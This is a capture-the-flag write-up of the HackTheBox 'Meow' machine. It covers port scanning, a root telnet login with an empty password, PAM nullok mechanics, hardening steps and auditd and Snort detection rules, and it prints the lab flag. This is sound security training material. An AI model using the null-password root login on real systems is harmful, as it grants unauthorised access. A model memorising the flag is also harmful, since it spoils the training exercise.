# Meow (HTB) - Unauthenticated Telnet & Null Password Misconfiguration

**Platform:** HackTheBox (Starting Point) | **Target OS:** Linux (Ubuntu 20.04.2 LTS)  
**Focus:** Cleartext Protocol Risk (Telnet RFC 854), PAM Authentication Mechanics, and `/etc/shadow` Misconfigurations  

---

## 🎯 Executive Summary
The "Meow" machine presents a classic administrative misconfiguration involving a legacy, unencrypted remote management protocol (Telnet) combined with a null (empty) password configuration for the `root` account. This combination allowed for immediate, unauthenticated root-level remote code execution without requiring exploitation payloads.

---

## 1. Reconnaissance & Network Protocol Analysis

We initiated network discovery using Nmap with a TCP SYN scan (`-sS`) targeting the top 1000 ports to minimize latency and log generation.

```bash
$ sudo nmap -sS -sV -T4 --top-ports 1000 10.129.58.255
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.129.58.255
Host is up (0.15s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Protocol Mechanics Analysis:**
Port 23/TCP was identified as running `Linux telnetd`. Unlike SSH (Port 22/TCP), Telnet operates over plain text (RFC 854), transmitting all session data—including authentication credentials and command input/output—in cleartext over the wire. From an OPSEC and network architecture perspective, exposing Telnet on a public or internal network segment exposes the host to trivial Man-in-the-Middle (MitM) credential sniffing.

---

## 2. Initial Access: Null-Password Exploitation

We initiated a Telnet session to interact with the authentication banner (`telnetd`).

```text
$ telnet 10.129.58.255
Trying 10.129.58.255...
Connected to 10.129.58.255.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login: admin
Password:
Login incorrect

Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
[...]
root@Meow:~# whoami
root
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```

**Execution Steps:**
1. An initial login attempt using a standard administrative username (`admin`) failed, confirming user enumeration checks were active.
2. Attempting a connection as `root` with a null (empty) password bypassed authentication entirely, instantly dropping the session into a `root` interactive shell.

---

## 3. OS Internals & Authentication Mechanics (Under the Hood)

To understand why a null password allowed instant access, we examine the underlying Linux Pluggable Authentication Modules (PAM) and system shadow file structure.

### The `/etc/shadow` Architecture
In Linux systems, password hashes are stored in `/etc/shadow`. The standard record format follows:
`username:password_hash:last_change:min:max:warn:inactive:expire`

In a misconfigured environment like this target host, the `root` entry resembles:
```text
root::19000:0:99999:7:::
```

### Deep Dive into PAM & `login` Logic:
1. **Empty Hash Field (`::`):** The two consecutive colons `::` immediately following the username field signify an **empty password string**.
2. **PAM Module Processing:** When `in.telnetd` spawns `/bin/login` to authenticate the user, PAM evaluates the `/etc/pam.d/login` stack (specifically `pam_unix.so`).
3. **Null Password Handling:** Unless the `nullok` flag is explicitly restricted or disabled within PAM configuration files, `pam_unix.so` recognizes the empty field as an authorized account requiring no cryptographic verification, bypassing the prompt and allocating a PTY shell directly to the user.

---

## 4. Defensive Remediation & Detection Engineering

### 1. Hardening & Mitigation
- **Decommission Telnet:** Completely disable and remove `telnetd` from the endpoint:
  ```bash
  sudo systemctl stop telnetd
  sudo systemctl disable telnetd
  sudo apt-get purge netkit-telnetd -y
  ```
- **Enforce SSH with Key-Based Authentication:** Migrate remote administration to SSH (Port 22) and disable password-based login entirely within `/etc/ssh/sshd_config`:
  ```text
  PasswordAuthentication no
  PermitRootLogin prohibit-password
  ```
- **Harden PAM Configuration:** Ensure the `nullok` argument is purged from `/etc/pam.d/common-auth` to prevent empty password accounts from logging in locally or remotely.

### 2. Detection Engineering
- **Auditd (Linux System Auditing):** Monitor remote logins spawning shells without authentication events:
  ```text
  -w /etc/shadow -p wa -k shadow_tampering
  -a always,exit -F arch=b64 -S execve -F euid=0 -k root_execution
  ```
- **Network Intrusion Detection (Snort/Suricata):** Alert on unencrypted Telnet connection attempts to system administrative ports:
  ```text
  alert tcp $EXTERNAL_NET any -> $HOME_NET 23 (msg:"TELNET Unencrypted Connection Attempt"; flags:S; sid:1000001; rev:1;)
  ```
